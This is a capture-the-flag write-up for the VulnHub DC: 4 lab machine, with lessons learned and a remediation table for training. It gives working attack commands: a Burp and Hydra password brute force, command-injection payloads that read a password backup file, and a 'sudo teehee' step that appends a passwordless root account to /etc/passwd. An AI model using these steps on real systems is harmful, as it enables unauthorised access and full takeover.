# DC: 4 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.101 (host-only) |
| **Difficulty** | Beginner |
| **OS** | Linux (Debian) |
| **Root Flag** | /root/flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-4,313/) |

## Attack Summary

HTTP admin panel → Burp Suite brute force → admin:happy → command injection → enumerate users → backup file with old passwords → Hydra SSH brute → jim:jibril04 → mail → charles:^xHhA&hvim0y → sudo teehee → write to /etc/passwd → root.

## Methodology

1. Network discovery; HTTP on 80, SSH on 22
2. Brute force admin panel with Burp Suite Intruder
3. Command injection via "System Tools" panel
4. Enumerate home directories and read backup password file
5. SSH brute force with Hydra
6. Pivot from jim to charles via mail
7. Privilege escalation via `sudo teehee` → /etc/passwd injection

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A 192.168.1.101
```

Expected ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian
80/tcp open  http    nginx 1.15.10
```

Browsing to port 80 shows an admin login page.

![Nmap scan](images/01-nmap.png)

---

## Step 2: Brute Force Admin Panel

Use Burp Suite Intruder on the login POST request with `rockyou.txt` as the password list for user `admin`.

Credential found: **admin / happy**

![Burp brute force](images/02-burp-brute.png)

---

## Step 3: Command Injection via System Tools

After login, navigate to the "Command" section under "System Tools". The panel executes system commands server-side.

Capture the request in Burp Repeater and inject into the `cmd` parameter:

```
cmd=ls /home
```

Three users discovered: **charles**, **jim**, **sam**.

Enumerate jim's backup directory:

```
cmd=ls /home/jim/backups
cmd=cat /home/jim/backups/old-passwords.bak
```

`old-passwords.bak` contains a list of old passwords.

![Command injection](images/03-cmd-injection.png)

---

## Step 4: SSH Brute Force with Hydra

Build user and password files from the enumerated data:

```bash
echo -e "charles\njim\nsam" > users.txt
# Paste old-passwords.bak content into passwords.txt
```

```bash
hydra -L users.txt -P passwords.txt 192.168.1.101 ssh
```

Result: **jim / jibril04**

---

## Step 5: Lateral Movement via Mail

SSH in as jim:

```bash
ssh jim@192.168.1.101
```

Check mail:

```bash
cat /var/mail/jim
```

An email from root to jim contains credentials for charles:

| User | Password |
|------|----------|
| charles | ^xHhA&hvim0y |

Switch users:

```bash
su charles
```

---

## Step 6: Privilege Escalation via `sudo teehee`

```bash
sudo -l
```

Charles can run `/usr/bin/teehee` as root without a password.

`teehee` is equivalent to `tee`: it reads stdin and appends to a file. Use it to inject a passwordless root account into `/etc/passwd`:

```bash
echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

Switch to the new root-level user and read the flag:

```bash
su raaj
whoami
# root
cat /root/flag.txt
```

![teehee privesc](images/04-teehee-privesc.png)
![Root flag](images/05-root-flag.png)

---

## Lessons Learned

1. **Predictable admin passwords** ("happy") are trivially brute-forced. Enforce complex passwords and account lockouts.
2. **Command injection in admin panels**: never pass user-controlled input directly to `exec()` or `shell_exec()`. Sanitize inputs and use parameterized APIs.
3. **Password reuse**: old-passwords.bak demonstrates why password rotation history and secure deletion matter.
4. **sudo teehee**: any tool that writes to files and can be run as root is a privesc vector. Audit sudoers strictly — only grant the minimum required.
5. **Mail-based credential leakage**: sensitive credentials should never be transmitted via unencrypted local mail.

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Weak admin password + brute force | Implement rate limiting, lockout policy, strong passwords |
| Command injection | Validate and sanitize all inputs; avoid shell command execution |
| Plaintext credentials in mail | Encrypt sensitive communication; use secrets management |
| sudo teehee NOPASSWD | Remove from sudoers; audit all NOPASSWD entries |
| Backup files with passwords | Rotate passwords immediately; delete old backup files securely |
